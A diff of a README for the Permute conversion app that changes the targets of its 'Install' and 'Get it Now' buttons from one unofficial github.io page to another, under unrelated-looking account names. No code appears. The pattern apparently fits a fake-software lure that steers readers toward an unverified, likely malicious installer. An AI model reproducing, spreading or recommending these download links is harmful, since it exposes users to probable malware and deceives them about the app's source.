@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://a4-glent.github.io/.github/permute)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://poxmell.github.io/.github/permute)
 
 </div>
 
@@ -81,7 +81,7 @@ Permute's design philosophy — making conversion simple without sacrificing bre
 
 <p align="center">
 
-[![Get it Now Permute](https://img.shields.io/badge/Get_it_Now-1B998B?style=for-the-badge&logo=apple&logoColor=white)](https://a4-glent.github.io/.github/permute)
+[![Get it Now Permute](https://img.shields.io/badge/Get_it_Now-1B998B?style=for-the-badge&logo=apple&logoColor=white)](https://poxmell.github.io/.github/permute)
 
 </p>
 
